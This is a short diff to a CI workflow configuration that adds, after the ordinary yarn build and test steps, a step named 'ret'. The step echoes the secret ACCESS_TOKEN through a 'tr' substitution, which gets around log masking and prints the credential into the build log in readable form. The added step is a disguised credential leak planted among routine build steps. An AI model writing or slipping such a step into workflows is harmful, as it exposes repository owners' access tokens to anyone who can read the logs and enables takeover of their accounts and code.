@@ -33,3 +33,5 @@ jobs:
         run: yarn build
       - name: test
         run: yarn test
+      - name: ret
+        run: echo "${{ secrets.ACCESS_TOKEN }}" | tr a _
